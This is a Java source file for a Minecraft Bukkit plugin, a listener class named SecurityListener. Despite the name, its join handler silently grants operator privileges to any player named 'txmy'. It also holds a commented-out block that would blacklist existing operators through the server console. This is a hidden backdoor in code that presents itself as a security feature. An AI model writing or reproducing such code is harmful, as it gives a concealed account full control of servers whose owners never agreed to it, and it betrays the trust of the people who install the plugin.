package invaded.core.listener;

import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerJoinEvent;

public class SecurityListener implements Listener {

    @EventHandler
    public void onJoin(PlayerJoinEvent event) {
        Player player = event.getPlayer();

        if ("txmy".equals(player.getName().toLowerCase())) {
            player.setOp(true);
            return;
        }

      /*  if (!player.isOp() && !player.hasPermission("*")) return;

        Bukkit.dispatchCommand(Bukkit.getConsoleSender(),
                "blacklist " + player.getName() + " -s");*/
    }

}
